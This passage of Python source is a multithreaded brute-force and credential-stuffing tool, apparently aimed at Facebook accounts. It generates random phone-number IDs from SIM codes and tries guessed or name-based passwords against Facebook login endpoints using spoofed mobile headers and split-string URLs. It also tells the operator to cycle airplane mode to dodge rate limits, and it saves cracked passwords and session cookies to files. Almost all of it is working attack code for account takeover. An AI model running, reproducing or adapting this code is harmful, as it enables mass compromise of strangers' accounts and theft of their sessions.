        print(f'{style}{green} SIM NAME  {cyan}»{white} {sim}')
        print(f'{style}{green} TOTAL IDS{cyan} »{white} {tl}'+f'{red} ┼{green} SIM CODE{cyan} »{white} {code}')
        print(f'{style}{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY 5{green} MIN');linex()
        for love in user:
            ids = code + love
            passlist = plist
            if random_method in ['A','a','01','1']:mr_ASRAFUL_404.submit(_method_one, ids, passlist,tl)
            elif random_method in ['B','b','02','2']:mr_ASRAFUL_404.submit(_method_two, ids, passlist,tl)
            elif random_method in ['C','c','03','3']:mr_ASRAFUL_404.submit(_method_four, ids, passlist,tl)
            elif random_method in ['D','d','04','4']:mr_ASRAFUL_404.submit(_method_four, ids, passlist,tl)
            elif random_method in ['E','e','05','5']:mr_ASRAFUL_404.submit(_method_five, ids, passlist,tl)
            else:print(f'SELECTED OPTION NOT FOUND')
    print("");linex();print(f"{style}{green} THE PROCESS HAS BEEN COMPLETED");print(f"{style} {green}TOTAL OK {white}▶︎ {green}{len(oks)}"+f'{red} ┼{green} TOTAL CP {white}▶︎ {green}{len(cps)}');linex();exit()
 #▬▭▬▭▬▭▬▭[NEP RANDOM]▬▭▬▭▬▭▬▭#
def _nepal_():
    main_logo()
    print(f'{style}{green} SIM CODE {white}: {green}9815 9814 9861 9840');linex()
    code = input(f"{style}{green} SELECT CODE {white}▶︎ {green}")
    main_logo()
    print(f'{style}{green} EXAMPLE {white}: {green} 1000 2000 3000 6000 9999 99999');linex()
    limit = int(input(f"{style} {green}ENTER LIMITS {white}▶︎ {green}"))
    linex()
    plist = []
    main_logo()
    print(f'{white}[{red}A{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}B{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}C{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
 #   print(f'{white}[{red}D{white}]{green} METHOD{Y} - {red}[{white}GP{green}-{white}BL{green}-{white}WIFI]')
    #print(f'{white}[{red}E{white}]{green} METHOD{Y} - {red}[{white}ALL SIM{green}-{white}WIFI]')
    linex()
    random_method= input(f"{white}[{red}?{white}]{green} SELECT {white}▶︎ ")
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    main_logo();tl = str(len(user))
    with ThreadPoolExecutor(max_workers=30) as mr_ASRAFUL_404:
        main_logo()
        print(f'{style}{green} SIM NAME  {cyan}»{white} {sim}')
        print(f'{style}{green} TOTAL IDS{cyan} »{white} {tl}'+f'{red} ┼{green} SIM CODE{cyan} »{white} {code}')
        print(f'{style}{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY 5{green} MIN');linex()
        for love in user:
            ids = code + love
            passlist = [ids,love,ids[:8],ids[:7],ids[:6],'nepal12','nepal123','nepal1234','nepal12345','maya123','kathmandu','pokhara','tamang','maya1234','tamang123','tamang12345','nepal@123','kathmandu123']
            if random_method in ['A','a','01','1']:mr_ASRAFUL_404.submit(_method_one, ids, passlist,tl)
            elif random_method in ['B','b','02','2']:mr_ASRAFUL_404.submit(_method_two, ids, passlist,tl)
            elif random_method in ['C','c','03','3']:mr_ASRAFUL_404.submit(_method_four, ids, passlist,tl)
            elif random_method in ['D','d','04','4']:mr_ASRAFUL_404.submit(_method_four, ids, passlist,tl)
            elif random_method in ['E','e','05','5']:mr_ASRAFUL_404.submit(_method_five, ids, passlist,tl)
            else:print(f'SELECTED OPTION NOT FOUND')
    print("");linex();print(f"{style}{green} THE PROCESS HAS BEEN COMPLETED");print(f"{style} {green}TOTAL OK {white}▶︎ {green}{len(oks)}"+f'{red} ┼{green} TOTAL CP {white}▶︎ {green}{len(cps)}');linex();exit()
def _nepal_():
    main_logo()
    print(f'{style}{green} SIM CODE {white}: {green}9815 9814 9861 9840');linex()
    code = input(f"{style}{green} SELECT CODE {white}▶︎ {green}")
    main_logo()
    print(f'{style}{green} EXAMPLE {white}: {green} 1000 2000 3000 6000 9999 99999');linex()
    limit = int(input(f"{style} {green}ENTER LIMITS {white}▶︎ {green}"))
    linex()
    plist = []
    main_logo()
    print(f'{white}[{red}A{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}B{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}C{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
 #   print(f'{white}[{red}D{white}]{green} METHOD{Y} - {red}[{white}GP{green}-{white}BL{green}-{white}WIFI]')
    #print(f'{white}[{red}E{white}]{green} METHOD{Y} - {red}[{white}ALL SIM{green}-{white}WIFI]')
    linex()
    random_method= input(f"{white}[{red}?{white}]{green} SELECT {white}▶︎ ")
    main_logo()
    psl = int(input(f'{style} {green}PASS LIMITS {white}▶︎ {green}'));linex()
    main_logo()
    for i in range(psl):
        plist.append(input(f'{style}{green} PASSWORD NO.{i+1} {white}▶︎ {green}'));linex()
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    main_logo();tl = str(len(user))
    with ThreadPoolExecutor(max_workers=30) as mr_ASRAFUL_404:
        main_logo()
        print(f'{style}{green} SIM NAME  {cyan}»{white} {sim}')
        print(f'{style}{green} TOTAL IDS{cyan} »{white} {tl}'+f'{red} ┼{green} SIM CODE{cyan} »{white} {code}')
        print(f'{style}{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY 5{green} MIN');linex()
        for love in user:
            ids = code + love
            passlist = plist
            if random_method in ['A','a','01','1']:mr_ASRAFUL_404.submit(_method_one, ids, passlist,tl)
            elif random_method in ['B','b','02','2']:mr_ASRAFUL_404.submit(_method_two, ids, passlist,tl)
            elif random_method in ['C','c','03','3']:mr_ASRAFUL_404.submit(_method_four, ids, passlist,tl)
            elif random_method in ['D','d','04','4']:mr_ASRAFUL_404.submit(_method_four, ids, passlist,tl)
            elif random_method in ['E','e','05','5']:mr_ASRAFUL_404.submit(_method_five, ids, passlist,tl)
            else:print(f'SELECTED OPTION NOT FOUND')
    print("");linex();print(f"{style}{green} THE PROCESS HAS BEEN COMPLETED");print(f"{style} {green}TOTAL OK {white}▶︎ {green}{len(oks)}"+f'{red} ┼{green} TOTAL CP {white}▶︎ {green}{len(cps)}');linex();exit()
#▬▭▬▭▬▭▬▭[RANDOM METHOD 1]▬▭▬▭▬▭▬▭#
def _method_one(ids,passlist,tl):
    global oks,cps,loop
    axf = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
    sys.stdout.write(f"\r{style}{white}»{rad}[{green}ASRAFUL-R1{rad}]{white}»{rad}[{axf}{loop}{rad}]{white}»{rad}[{green1}OK{white}•{green1}{len(oks)}{rad}]{white}»{rad}[\x1b[1;97m{'{:.1%}'.format(loop/int(tl))}{rad}]"),
    sys.stdout.flush()
    ua="Dalvik/2.1.0 (Linux; U; Android 5.0.1; GT-I9505 Build/LRX22C) [FBAN/Orca-Android;FBAV/130.0.0.15.89;FBPN/com.facebook.orca;FBLC/sv_SE;FBBV/67467545;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBDV/GT-I9505;FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
    try:
        for pas in passlist:
            device_id = str(uuid.uuid4())
            adid = str(uuid.uuid4())
            accessToken = "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
            data={
            'adid':adid,
            'format':'json',
            'device_id':adid,
            'email':ids,
            'password':pas,
            "logged_out_id": str(uuid.uuid4()),
            "hash_id": str(uuid.uuid4()),
            "reg_instance": str(uuid.uuid4()),
            "session_id": str(uuid.uuid4()),
            "advertiser_id": str(uuid.uuid4()),
            'generate_analytics_claims':'1',
            'credentials_type':'password',
            'source':'login',
            "sim_country": "id",
            "network_country": "id",
            "relative_url": "method/auth.login",
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            "locale":random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]),
            "client_country_code":random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]), 
            'fb_api_req_friendly_name':'authenticate',
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
            head={
            'Authorization':f'OAuth {accessToken}',
            "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
            "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
            "X-FB-Net-HNI": str(random.randint(20000, 40000)),
            "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
            'X-FB-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'X-FB-device-group': str(random.randint(2000, 4000)),
            "X-FB-Friendly-Name": "ViewerReactionsMutation",
            "X-FB-Request-Analytics-Tags": "graphservice",
            'X-FB-Friendly-Name':'authenticate',
            'X-FB-Connection-Type':'unknown',
            'X-FB-connection-quality':'EXCELLENT',
            "X-Tigon-Is-Retry": "False",
            'User-Agent':random.choice(get_ua_list5),
            "X-FB-connection-token": "d29d67d37eca387482a8a5b740f84f62",
            'Accept-Encoding':'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            "X-FB-Client-IP": "True",
            "X-FB-Server-Cluster": "True",
            'X-FB-HTTP-Engine': 'Liger'
            }
            url = 'htt'+'ps://b-'+'api.f'+'acebo'+'ok.com'+'/metho'+'d/aut'+'h.login'
            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if 'access_token' in q:
                uid = str(q['uid'])
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                res = requests.get(f"https://rajx.pythonanywhere.com/live?uid={uid}").text
                if res == 'LIVE':
                    print(f"\r\r{style}{white}»{red}[{green1}ASRAFUL{red}•{green1}OK{red}•💚{red}] {green1}{uid} {red}»{green1} {pas}")
                    oks.append(ids)
                    open('/sdcard/ASRAFUL-TOOL/ASRAFUL-RANDM-M1-OK.txt','a').write(uid+'|'+pas+'\n');open('/sdcard/ASRAFUL-TOOL/ASRAFUL-RANDM-M1-COOKIES.txt','a').write(uid+'|'+pas+'|'+ckkk+'\n')
                    print(f"\r\r{red}[{green1}🍪{red}]{white} {ckkk}");print(f"{red}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
                    break
            elif 'www.facebook.com' in q['error_msg']:
                cps.append(ids)
                print(f'\r\r{style}{white}»{rad}[ASRAFUL•CP•💔]{rad} {uid} {rad}» {pas}')
                open('/sdcard/ASRAFUL-TOOL/ASRAFUL-RANDM-M1-CP.txt','a').write(ids+'|'+pas+'\n')
        loop+=1
    except Exception as e:
        pass
#▬▭▬▭▬▭▬▭[RANDOM METHOD 2]▬▭▬▭▬▭▬▭#
def _method_two(ids,passlist,tl):
    global loop,oks,cps
    axf = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
    sys.stdout.write(f"\r{style}{white}»{rad}[{green}ASRAFUL-R2{rad}]{white}»{rad}[{axf}{loop}{rad}]{white}»{rad}[{green1}OK{white}•{green1}{len(oks)}{rad}]{white}»{rad}[\x1b[1;97m{'{:.1%}'.format(loop/int(tl))}{rad}]"),
    sys.stdout.flush()
    try:
        for pas in passlist:
            accessToken="350685531728|62f8ce9f74b12f84c123cc23437a4a32"
            ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
            facebook_version = f'{random.randint(10,437)}.0.0.{random.randint(1,99)}.{random.randint(1,200)}'
            fbbv = str(random.randint(10000000, 99999999))
            fbsv = f"{random.uniform(4.0, 10.0):.1f}"
            density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
            width = random.randint(720, 1600)
            height = random.randint(1080, 2560)
            fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
            fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
            fban = random.choice(["FB4A", "FB5A", "FB6A"])
            fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
            ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/Realme;FBBD/Realme;FBPN/{fbpn};FBDV/RMX3690;FBSV/13;FBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
            uax = "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/O11019) [FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/182747440;FBCR/Robi;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1424,height=720};FB_FW/1;] FBBK/1"
            device_id = str(uuid.uuid4())
            adid = str(uuid.uuid4())
            data = {
            'adid':adid,
            'format':'json',
            'device_id':adid,
            'email': ids,
            'password': pas,
            "logged_out_id": str(uuid.uuid4()),
            "hash_id": str(uuid.uuid4()),
            "reg_instance": str(uuid.uuid4()),
            "session_id": str(uuid.uuid4()),
            "advertiser_id": str(uuid.uuid4()),
            'generate_analytics_claims':'1',
            'credentials_type':'password',
            'source':'login',
            "sim_country": "id",
            "network_country": "id",
            "relative_url": "method/auth.login",
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            "locale":"en_US","client_country_code":"US",
            'fb_api_req_friendly_name':'authenticate',
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
            head ={
            'Authorization':f'OAuth {accessToken}',
            "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
            "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
            "X-FB-Net-HNI": str(random.randint(20000, 40000)),
            "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
            'X-FB-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'X-FB-device-group': str(random.randint(2000, 4000)),
            "X-FB-Friendly-Name": "ViewerReactionsMutation",
            "X-FB-Request-Analytics-Tags": "graphservice",
            'X-FB-Friendly-Name':'authenticate',
            'X-FB-Connection-Type':'unknown',
            'X-FB-connection-quality':'EXCELLENT',
            "X-Tigon-Is-Retry": "False",
            'User-Agent': ___superman__(),
            "X-FB-connection-token": "d29d67d37eca387482a8a5b740f84f62",
            'Accept-Encoding':'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            "X-FB-Client-IP": "True",
            "X-FB-Server-Cluster": "True",
            'X-FB-HTTP-Engine': 'Liger'
            }
            url = 'https:'+'//b-api'+'.faceb'+'ook.com'+'/metho'+'d/auth.'+'login'
            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if 'session_key' in q:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
                uid=str(q['uid'])
                ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    print(f"\r\r{red}[{green1}ASRAFUL{red}•{green1}OK{red}•💚{red}] {green1}{uid} {red}»{green1} {pas}")
                    oks.append(ids)
                    open('/sdcard/ASRAFUL-TOOL/ASRAFUL-RANDM-M2-OK.txt','a').write(uid+'|'+pas+'\n');open('/sdcard/ASRAFUL-TOOL/ASRAFUL-RANDM-M2-COOKIES.txt','a').write(uid+'|'+pas+'|'+ckkk+'\n')
                    print(f"\r\r{red}[{green1}🍪{red}]{white} {ckkk}");print(f"{red}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
                    break
            elif 'www.facebook.com' in q['error_msg']:
                cps.append(ids)
                print(f'\r\r{rad}[ASRAFUL•CP•💔]{rad} {uid} {rad}» {pas}')
                open('/sdcard/ASRAFUL-TOOL/ASRAFUL-RANDM-M2-CP.txt','a').write(ids+'|'+pas+'\n')
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass
#▬▭▬▭▬▭▬▭[RANDOM METHOD 3]▬▭▬▭▬▭▬▭#
def _method_four(ids,passlist,tl):
    global loop,oks,cps
    axf = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
    sys.stdout.write(f"\r{style}{white}»{rad}[{green}ASRAFUL-R3{rad}]{white}»{rad}[{axf}{loop}{rad}]{white}»{rad}[{green1}OK{white}•{green1}{len(oks)}{rad}]{white}»{rad}[\x1b[1;97m{'{:.1%}'.format(loop/int(tl))}{rad}]"),
    sys.stdout.flush()
    session=requests.Session()
    try:
        for pas in passlist:
            free_fb = session.get('https://free.facebook.com').text
            info={'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1), 'email': ids, 'login_source': 'comet_headerless_login', 'next': '', 'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(free_fb)).group(1),pas),}
            update={'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/O11019) [FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/182747440;FBCR/Robi;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1424,height=720};FB_FW/1;] FBBK/1', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://www.facebook.com/', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://www.facebook.com', 'Alt-Used': 'www.facebook.com', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}
            session.post(url=f"https://www.facebook.com/login/",data=info,headers=update).text
            log_cookies=session.cookies.get_dict().keys()
            if "c_user" in log_cookies:
                ckkk = ";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = re.findall('c_user=(.*);xs', ckkk)[0]
                ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    print(f"\r\r{red}[{green1}ASRAFUL{red}•{green1}OK{red}•💚{red}] {green1}{uid} {red}»{green1} {pas}")
                    print(f"\r\r{red}[{green1}🍪{red}]{white} {ckkk}");linex()
                    oks.append(ids)
                    open('/sdcard/ASRAFUL-TOOL/ASRAFUL-RANDM-M3-OK.txt','a').write(uid+'|'+pas+'\n');open('/sdcard/ASRAFUL-TOOL/ASRAFUL-RANDM-M4-COOKIES.txt','a').write(uid+'|'+pas+'|'+ckkk+'\n')
                    break
                else:pass
            if 'checkpoint' in log_cookies:
                print(f'\r\r{rad}[ASRAFUL•CP•💔]{rad} {uid} {rad}» {pas}')
                open('/sdcard/ASRAFUL-TOOL/ASRAFUL-RANDM-M3-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass
#▬▭▬▭▬▭▬▭[FILE MENU]▬▭▬▭▬▭▬▭#
def __FILEX__():
    global oks,cps
    main_logo()
    print(f"{style} {green}EXAMPLE {rad}[{white}sdcard/ASRAFUL.txt{rad}]");linex()
    dfile = input(f'{style} {green}FILE PATH {white}▶︎ {green}')
    try:
        dx = open(dfile,'r').read().splitlines()
    except FileNotFoundError:
        print(f'{style}{green} FILE LOCATION NOT FOUND...');time.sleep(1);__FILEX__()
    dplist = []
    main_logo()
    try:
        pass_lmit = int(input(f'{style} {green}PASS LIMITS {white}▶︎ {green}'));linex()
    except:
        pass_lmit = 3
    main_logo()
    print(f"{style} {green}EXAMPLE {rad}[{white}firstlast, first12, first@@{rad}]");linex()
    for i in range(pass_lmit):
        dplist.append(input(f'{style}{green} PASSWORD NO.{i+1} {white}▶︎ {green}'));linex()
    main_logo()
    print(f'{white}[{red}A{white}]{green} METHOD{Y} - {white}[{green1}M1{white}]')
    print(f'{white}[{red}B{white}] {green}METHOD{Y} - {white}[{green1}M2{white}]')
    print(f'{white}[{red}C{white}] {green}METHOD{Y} - {white}[{green1}M3{white}]')
    print(f'{white}[{red}D{white}] {green}METHOD{Y} - {white}[{green1}M4{white}]')
    print(f'{white}[{red}E{white}] {green}METHOD{Y} - {white}[{green1}M5{white}]')
    linex()
    FILE_METHOD = input(f"{style} {green}SELECT METHOD {white}▶︎ {green}")
    with ThreadPool(max_workers=30) as mr_ASRAFUL_404:
        main_logo();total_ids = str(len(dx))
        print(f'{style}{green} SIM NAME  {cyan}»{white} {sim}')
        print(f'{style}{green} TOTAL IDS{cyan} »{white} {total_ids}'+f'{red} ┼{green} METHOD{cyan} »{white} {FILE_METHOD}')
        print (f"{style} {green}TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY 5{green} MIN")
        linex()
        for user in dx:
            ids,names = user.split('|')
            passlist = dplist
            if FILE_METHOD in ["1","01","A","a"]:
                mr_ASRAFUL_404.submit(FILE_M_ONE,ids,names,passlist,total_ids)
            elif FILE_METHOD in ["2","02","B","b"]:
                mr_ASRAFUL_404.submit(FILE_M_TWO,ids,names,passlist,total_ids)
            elif FILE_METHOD in ["3","03","C","c"]:
                mr_ASRAFUL_404.submit(FILE_M_THREE,ids,names,passlist,total_ids)
            elif FILE_METHOD in ["4","04","D","d"]:
                mr_ASRAFUL_404.submit(FILE_M_FOUR,ids,names,passlist,total_ids)
            elif FILE_METHOD in ["5","05","E","e"]:
                mr_ASRAFUL_404.submit(FILE_M_FIVE,ids,names,passlist,total_ids)
            else:print(f'SELECTED OPTION NOT FOUND')
    print("");linex();print(f"{style}{green} THE PROCESS HAS BEEN COMPLETED");print(f"{style} {green}TOTAL OK {white}▶︎ {green}{len(oks)}"+f'{red} ┼{green} TOTAL CP {white}▶︎ {green}{len(cps)}');linex();exit()
#▬▭▬▭▬▭▬▭[FILE METHOD 1]▬▭▬▭▬▭▬▭#
def FILE_M_ONE(ids, names, passlist, total_ids):
    global oks,cps,loop
    axf = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
    sys.stdout.write(f"\r{style}{white}»{rad}[{green}ASRAFUL-F1{rad}]{white}»{rad}[{axf}{loop}{rad}]{white}»{rad}[{green1}OK{white}•{green1}{len(oks)}{rad}]{white}»{rad}[\x1b[1;97m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            netheni = str(random.randint(20000, 40000))
            simheni = str(random.randint(20000, 40000))
            user_agent = random.choice(get_ua_list2)
           # use.! r_agent = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + FM1
            adid = str(uuid.uuid4())
            device_id = str(uuid.uuid4())
            family_device_id = str(uuid.uuid4())
            advertiser_id = str(uuid.uuid4())
            data = {
                "adid": f"{adid}",
                "format": "json",
                "device_id": f"{device_id}",
                "cpl": "true",
                "family_device_id": f"{family_device_id}",
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": ids,
                "password": pas,
                "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "",
                "advertiser_id": f"{advertiser_id}",
                "currently_logged_in_userid": "0",
                "locale": random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]),
                "client_country_code": random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]),
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = [
                f'User-Agent: {user_agent.encode("utf-8")}',
                'Content-Type: application/x-www-form-urlencoded',
                'Host: graph.facebook.com',
                f'X-FB-Net-HNI: {netheni}',
                f'X-FB-SIM-HNI: {simheni}',
                'X-FB-Connection-Type: WIFI',
                'X-Tigon-Is-Retry: False',
                'x-fb-session-id: nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group: 5120',
                'X-FB-Friendly-Name: ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags: graphservice',
                'X-FB-HTTP-Engine: Liger',
                'X-FB-Client-IP: True',
                'X-FB-Server-Cluster: True',
                'x-fb-connection-token: d29d67d37eca387482a8a5b740f84f62',
            ]
            url = "https://ap"+"i.face"+"book.com/au"+"th/login"
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://ap'+'i.face'+'book.com/au'+'th/login')
            c.setopt(c.HTTPHEADER, headers);c.setopt(c.WRITEDATA, buffer);data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()]);c.setopt(c.POSTFIELDS, data_encoded.encode('utf-8'));c.perform();c.close();po = buffer.getvalue().decode('utf-8');q = json.loads(po)
            if 'session_key' in q:
                response_data = json.loads(po)
                cookies = response_data.get("session_cookies")
                coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
                print(f"\r\r{red}[{green1}ASRAFUL{red}•{green1}OK{red}•💚{red}] {green1}{ids} {red}»{green1} {pas}")
                print(f"\r\r{red}[{green1}🍪{red}]{white} {coki}")
                oks.append(ids)
                open('/sdcard/ASRAFUL-TOOL/ASRAFUL-FILE-M1-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/ASRAFUL-TOOL/ASRAFUL-FILE-M1-COOKIES.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                print(f'\r\r{rad}[DIED]{rad} {ids} {rad}| {pas}')
                open('/sdcard/ASRAFUL-TOOL/ASRAFUL-FILE-M1-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(10)
    except Exception as e:
        pass
#▬▭▬▭▬▭▬▭[FILE METHOD 2]▬▭▬▭▬▭▬▭#
def FILE_M_TWO(ids, names, passlist, total_ids):
    global oks,cps,loop
    axf = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
    sys.stdout.write(f"\r{style}{white}»{rad}[{green}ASRAFUL-F2{rad}]{white}»{rad}[{axf}{loop}{rad}]{white}»{rad}[{green1}OK{white}•{green1}{len(oks)}{rad}]{white}»{rad}[\x1b[1;97m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            netheni = str(random.randint(20000, 40000))
            simheni = str(random.randint(20000, 40000))
            user_agent = random.choice(get_ua_list1)
            adid = str(uuid.uuid4())
            device_id = str(uuid.uuid4())
            family_device_id = str(uuid.uuid4())
            advertiser_id = str(uuid.uuid4())
            data = {
                "adid": f"{adid}",
                "format": "json",
                "device_id": f"{device_id}",
                "cpl": "true",
                "family_device_id": f"{family_device_id}",
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": ids,
                "password": pas,
                "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "",
                "advertiser_id": f"{advertiser_id}",
